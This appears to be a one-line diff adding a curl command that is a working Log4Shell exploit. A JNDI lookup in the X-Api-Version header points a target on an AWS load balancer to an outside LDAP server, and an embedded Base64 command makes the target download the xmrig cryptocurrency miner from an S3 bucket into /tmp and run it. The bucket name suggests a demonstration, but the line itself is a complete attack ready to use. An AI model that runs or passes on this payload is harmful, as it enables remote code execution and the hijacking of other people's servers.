@@ -1,0 +1,1 @@
+curl http://a2f5eee7f554240f0aa323d80f730bc0-2112827677.eu-west-1.elb.amazonaws.com/api/ -H 'X-Api-Version: ${jndi:ldap://ec2-34-252-239-226.eu-west-1.compute.amazonaws.com:1389/Basic/Command/Base64/d2dldCBodHRwczovL2NweC1kZW1vLnMzLmV1LXdlc3QtMS5hbWF6b25hd3MuY29tL3htcmlnIC1PIC90bXAveG1yaWcgOyBjaG1vZCAreCAvdG1wL3htcmlnOyAvdG1wL3htcmlnIDsgc2xlZXAgMTs=}'
